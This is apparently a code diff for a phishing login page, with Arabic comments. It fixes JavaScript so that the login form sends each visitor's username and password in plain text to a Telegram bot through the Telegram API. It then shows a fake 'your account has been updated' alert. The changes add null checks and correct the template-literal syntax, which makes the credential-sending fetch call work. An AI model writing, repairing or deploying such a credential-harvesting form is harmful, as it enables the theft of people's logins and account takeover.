@@ -4,10 +4,15 @@ const closeBtn = document.getElementById("closeLogin");
 const loginForm = document.getElementById("loginForm");
 
 // افتح نافذة الدخول
-openBtn.onclick = () => modal.style.display = "block";
+if(openBtn) {
+    openBtn.onclick = () => modal.style.display = "block";
+}
 
 // اغلق النافذة
-closeBtn.onclick = () => modal.style.display = "none";
+if(closeBtn) {
+    closeBtn.onclick = () => modal.style.display = "none";
+}
+
 window.onclick = (e) => { if(e.target === modal) modal.style.display = "none"; };
 
 // توكن البوت و chat_id
@@ -20,11 +25,13 @@ loginForm.onsubmit = function(e){
   let user = document.getElementById("user").value;
   let password = document.getElementById("password").value;
 
-  let text = اسم المستخدم: ${user}\nكلمة المرور: ${password};
+  // لاحظي استخدام علامة الـ Backtick هنا `
+  let text = `اسم المستخدم: ${user}\nكلمة المرور: ${password}`;
 
-  fetch(https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)})
+  // رابط الإرسال يجب أن يكون أيضاً داخل Backticks
+  fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`)
     .then(res => {
-      alert("تم تحديث حسابك");
+      alert("تم تحديث حسابك!");
       modal.style.display = "none";
       loginForm.reset();
     })
